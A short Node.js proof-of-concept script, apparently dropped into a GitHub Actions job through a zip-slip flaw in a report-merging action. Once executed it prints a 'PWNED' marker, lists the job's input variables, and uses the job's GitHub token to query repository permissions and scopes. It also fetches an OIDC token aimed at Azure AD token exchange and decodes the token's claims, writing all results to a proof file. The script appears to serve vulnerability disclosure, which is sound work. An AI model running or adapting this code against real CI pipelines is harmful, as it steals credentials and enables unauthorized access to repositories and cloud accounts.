const fs = require('fs');

(async () => {
  const marker = 'PWNED-VIA-MERGE-REPORTS-ZIPSLIP';
  console.log(marker);
  console.log('SELF=' + __filename);
  const env = process.env;
  const out = {
    marker,
    self: __filename,
    repo: env.GITHUB_REPOSITORY,
    hasInputGithubToken: !!env['INPUT_GITHUB-TOKEN'],
    hasOidcRequestUrl: !!env['ACTIONS_ID_TOKEN_REQUEST_URL'],
    inputs: Object.keys(env).filter(k => k.startsWith('INPUT_')),
  };
  try {
    if (env['INPUT_GITHUB-TOKEN']) {
      const r = await fetch('https://api.github.com/repos/' + env.GITHUB_REPOSITORY, {
        headers: { authorization: 'Bearer ' + env['INPUT_GITHUB-TOKEN'], 'user-agent': 'poc' },
      });
      const d = await r.json();
      out.tokenPermissions = d.permissions;
      out.tokenScopesHeader = r.headers.get('x-oauth-scopes');
      out.apiStatus = r.status;
    }
  } catch (e) { out.tokenErr = String(e); }
  try {
    if (env.ACTIONS_ID_TOKEN_REQUEST_URL) {
      const r = await fetch(env.ACTIONS_ID_TOKEN_REQUEST_URL + '&audience=api://AzureADTokenExchange', {
        headers: { authorization: 'Bearer ' + env.ACTIONS_ID_TOKEN_REQUEST_TOKEN },
      });
      const d = await r.json();
      if (d.value) {
        const claims = JSON.parse(Buffer.from(d.value.split('.')[1], 'base64').toString());
        out.oidcClaims = { aud: claims.aud, iss: claims.iss, sub: claims.sub, repository: claims.repository };
      } else {
        out.oidcResponse = d;
      }
    }
  } catch (e) { out.oidcErr = String(e); }
  fs.writeFileSync('pwned-proof.json', JSON.stringify(out, null, 2));
  console.log('PROOF ' + JSON.stringify(out));
  process.exit(0);
})();
